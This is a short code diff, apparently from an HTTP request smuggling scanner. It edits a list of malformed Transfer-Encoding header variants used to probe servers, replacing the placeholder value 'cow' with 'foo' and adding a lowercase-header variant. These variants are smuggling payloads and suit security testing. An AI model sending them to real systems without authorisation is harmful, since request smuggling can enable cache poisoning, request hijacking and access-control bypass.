@@ -15,13 +15,14 @@ def render_template(gadget):
 mutations["space1"] = render_template("Transfer-Encoding : chunked")
 mutations["nameprefix1"] = render_template(" Transfer-Encoding: chunked")
 mutations["tabprefix1"] = render_template("Transfer-Encoding:\tchunked")
-mutations["revdualchunk"] = render_template("Transfer-Encoding: cow\r\nTransfer-Encoding: chunked")
-mutations["revdualchunk2"] = render_template("Transfer-Encoding: chunked\r\nTransfer-Encoding: cow")
-mutations["commaCow"] = render_template("Transfer-Encoding: chunked, cow")
-mutations["cowComma"] = render_template("Transfer-Encoding: cow, chunked")
+mutations["revdualchunk"] = render_template("Transfer-Encoding: foo\r\nTransfer-Encoding: chunked")
+mutations["revdualchunk2"] = render_template("Transfer-Encoding: chunked\r\nTransfer-Encoding: foo")
+mutations["commaCow"] = render_template("Transfer-Encoding: chunked, foo")
+mutations["cowComma"] = render_template("Transfer-Encoding: foo, chunked")
 mutations["x-nout"] = render_template("X:X\nTransfer-Encoding: chunked")
 mutations["cr2hyphen"] = render_template("Transfer\rEncoding: chunked")
 mutations["linewrapped1"] = render_template("Transfer-Encoding:\n chunked")
+mutations["encoing"] = render_template("Transfer-encoding: chunked")
 # mutations["tabprefix2"] = render_template("Transfer-Encoding\t:\tchunked")
 
 # for i in [0x1,0x4,0x8,0x9,0xa,0xb,0xc,0xd,0x1F,0x20,0x7f,0xA0,0xFF]:
